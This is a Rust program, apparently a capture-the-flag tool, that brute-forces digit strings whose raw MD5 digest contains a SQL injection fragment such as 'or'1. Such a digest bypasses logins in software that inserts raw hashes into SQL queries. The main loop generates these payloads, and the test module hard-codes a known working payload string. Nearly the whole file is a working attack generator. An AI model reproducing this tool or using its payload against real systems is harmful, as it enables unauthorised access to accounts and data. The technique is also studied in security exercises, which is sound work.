use md5::{
    digest::{core_api::CoreWrapper, FixedOutputReset, Output},
    Digest, Md5, Md5Core,
};
use once_cell::sync::Lazy;
use rand::{distributions, thread_rng, Rng};
use regex::bytes::Regex;

/// Regex to detect an escape, followed by an OR pattern, followed by another opening single quote then a digit
/// This is significantly faster than the previous string search method.
static INJECTION_REGEX: Lazy<Regex> = Lazy::new(|| Regex::new(r"'(\|\||or)'\d").unwrap());

#[inline]
fn byte_validate(digest: &[u8]) -> bool {
    INJECTION_REGEX.is_match(digest)
}

// 87153179503375488964249572016766023268706569805029887102402011499288342510775092757977654940386142689199562616975803271832089582121260280598138107679172885818920928633840231384484533108096150415512236913966

fn main() {
    crack();
}

fn crack() {
    // Create all in memory objects here to reduce re-allocation.
    let mut i = 0;
    let mut buf = String::with_capacity(400);
    // Ascii codes for digits.
    let uniform_ascii_digits = distributions::Uniform::from(48..=57);
    // Distribution for selecting random
    let mut hasher = Md5::new();
    loop {
        if i % 1_000_000 == 0 {
            println!("i = {i}");
        }

        #[cfg(feature = "perf")]
        if i > 10_000_000 {
            return;
        }

        if i % 100 == 0 {
            buf.clear();
        }

        i += 1;

        // Push new string to buf
        unsafe {
            buf.push(char::from_u32_unchecked(
                thread_rng().sample(uniform_ascii_digits),
            ));
        }

        // Calculate md5 hash
        let gen_digest = rust_digest(&mut hasher, &buf);
        let digest = gen_digest.as_slice();

        // Check if we can create the OR statement from it.
        if byte_validate(digest) {
            println!("Found! i = {i}");
            println!("Content = {buf}");
            let str_digest = String::from_utf8_lossy(digest);
            println!("Raw md5 Hash = {str_digest}");
            return;
        }
    }
}

fn rust_digest(hasher: &mut Md5, buf: &str) -> Output<CoreWrapper<Md5Core>> {
    hasher.update(buf);
    hasher.finalize_fixed_reset()
}

#[cfg(test)]
mod test {

    use crate::{byte_validate, rust_digest};

    use md5::{Digest, Md5};

    const BUF: &str = "129581926211651571912466741651878684928";

    #[test]
    fn test_rust_md5_validation() {
        let mut hasher = Md5::new();

        let raw_digest = rust_digest(&mut hasher, BUF);
        let digest = raw_digest.as_slice();
        let str_digest = String::from_utf8_lossy(digest);
        println!("{str_digest}");
        assert!(byte_validate(digest));
    }
}
